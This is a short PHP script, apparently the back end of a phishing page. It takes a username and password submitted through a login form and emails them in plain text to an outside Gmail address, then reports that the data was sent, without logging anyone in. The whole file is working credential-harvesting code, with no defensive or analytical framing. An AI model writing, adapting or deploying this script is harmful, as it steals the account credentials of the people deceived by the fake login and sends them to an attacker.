<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = htmlspecialchars($_POST['usuario']);
    $clave = htmlspecialchars($_POST['clave']);

    $destinatario = "lv0851044@gmail.com";
    $asunto = "Nuevo intento de login";
    $mensaje = "Usuario: $usuario\nContraseña: $clave";

    $cabeceras = "From: notificaciones@tuweb.com";

    if (mail($destinatario, $asunto, $mensaje, $cabeceras)) {
        echo "Datos enviados correctamente.";
    } else {
        echo "Error al enviar los datos.";
    }
} else {
    echo "Acceso no autorizado.";
}
?>
